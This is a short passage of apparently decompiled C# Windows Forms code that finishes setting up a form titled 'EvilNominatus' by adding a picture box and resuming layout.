		((Control)this).Controls.Add((Control)(object)pictureBox1);
		((Control)this).Name = "MainForm";
		((Control)this).Text = "EvilNominatus";
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
